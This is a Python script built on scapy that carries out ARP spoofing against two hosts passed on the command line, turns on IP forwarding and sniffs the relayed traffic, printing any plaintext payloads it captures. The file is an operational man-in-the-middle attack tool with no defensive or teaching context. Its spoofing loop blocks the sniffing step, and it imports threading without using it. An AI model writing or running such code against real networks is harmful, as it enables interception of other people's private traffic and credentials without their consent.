from scapy.all import ARP, Ether, send, sniff, conf, IP, getmacbyip
import sys
import scapy.all as scap
import os
import threading
import html

def safe_print(*args, **kwargs):
    """Wrapper for print that handles encoding issues"""
    try:
        __builtins__.print(*args, flush=True, **kwargs)
    except UnicodeEncodeError:
        # If we hit encoding errors, try to sanitize the output
        cleaned = []
        for arg in args:
            if isinstance(arg, str):
                cleaned.append(arg.encode('ascii', errors='replace').decode('ascii'))
            else:
                cleaned.append(str(arg))
        __builtins__.print(*cleaned, flush=True, **kwargs)

print = safe_print

def enable_ip_forwarding():
    """ Enables IP forwarding to relay packets between victims """
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") # this is a special file used for ip forwarding and echo 1 writes 1 in this file hence enabling the ip forwarding
    print("[Done] IP Forwarding Enabled")


def arp_spoof(friendA,macA, friendB, macB):
    """ Sends spoofed ARP packets to trick victim into thinking we are target """    
    try:
        while True:
            packet = scap.ARP(op=1, pdst=friendA, hwdst=macA, psrc=friendB)
            scap.send(packet, verbose=False) 
            packet = scap.ARP(op=1, pdst=friendB, hwdst=macB, psrc=friendA)
            scap.send(packet, verbose=False) 
    except KeyboardInterrupt:
        print("Exiting Gracefully...")
    
def sniff_packets(interface):
    """ Sniffs packets and logs HTTP requests & plaintext data """
    print(f"[*] Sniffing on {interface}")

    def process_packet(packet):
        if packet.haslayer(IP):         # to check if the packet has IP layer header
            src = packet[IP].src
            dst = packet[IP].dst

            if packet.haslayer("Raw"):  # This checks if the packet contains a Raw layer. The Raw layer contains the actual data/payload of the packet
                payload = packet["Raw"].load.decode('utf-8', errors="ignore")  # ignore undecodable bytes
                cleaned = ''.join(c for c in payload if c.isprintable())        # remove non-printable chars
                print(f"[Data from {src}] Data Captured: {html.escape(cleaned)}")

    sniff(iface=interface, prn=process_packet, store=False)

if __name__ == "__main__":
    friend_a = sys.argv[1]
    friend_a_mac = sys.argv[2]
    friend_b = sys.argv[3]
    friend_b_mac = sys.argv[4]
    interface = sys.argv[5]


    enable_ip_forwarding()

    # Start spoofing both victims simultaneously
    arp_spoof(friend_a, friend_a_mac, friend_b, friend_b_mac)

    # Start sniffing the traffic
    sniff_packets(interface)
